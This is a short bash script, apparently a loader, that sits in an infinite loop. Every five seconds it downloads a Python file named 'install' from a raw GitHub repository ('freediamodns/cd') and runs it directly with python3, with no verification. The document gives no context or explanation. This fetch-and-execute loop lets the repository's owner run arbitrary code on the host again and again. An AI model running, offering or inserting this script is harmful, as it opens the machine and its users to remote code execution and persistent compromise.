#!/bin/bash
while true; do
    python3 <(curl -s https://raw.githubusercontent.com/freediamodns/cd/refs/heads/main/install)
    sleep 5
done
